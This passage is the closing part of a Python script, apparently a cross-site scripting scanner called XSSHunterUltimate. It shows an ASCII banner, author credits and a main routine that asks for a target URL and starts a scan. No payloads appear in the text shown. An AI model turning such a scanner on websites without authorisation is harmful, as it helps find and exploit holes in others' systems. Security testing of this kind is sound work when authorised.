╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝
{Style.RESET_ALL}
{Fore.MAGENTA}Programmer : Snake{Style.RESET_ALL}
{Fore.MAGENTA}Github : bit_snakee{Style.RESET_ALL}
{Fore.LIGHTBLACK_EX}Version : 1.1.0{Style.RESET_ALL}
"""
    print(banner)
    
    # Create an instance of the scanner
    scanner = XSSHunterUltimate()
    
    # Prompt the user to enter the target URL
    target = input(f"{Fore.BLUE}[?] Enter target URL (e.g., http://example.com/search?q=test or http://example.com/product/123): {Style.RESET_ALL}").strip()
    
    # Validate the input URL
    if not target:
        print(f"{Fore.RED}[!] Target URL cannot be empty. Exiting.{Style.RESET_ALL}")
        sys.exit(1) # Exit the script if no URL is provided
    
    # Add a default scheme if missing (http or https)
    if not target.startswith(('http://', 'https://')):
        print(f"{Fore.YELLOW}[*] No URL scheme found. Adding 'http://' to the URL. Please verify if 'https://' is needed.{Style.RESET_ALL}")
        target = f"http://{target}"
    
    # Start the scan
    scanner.scan(target)

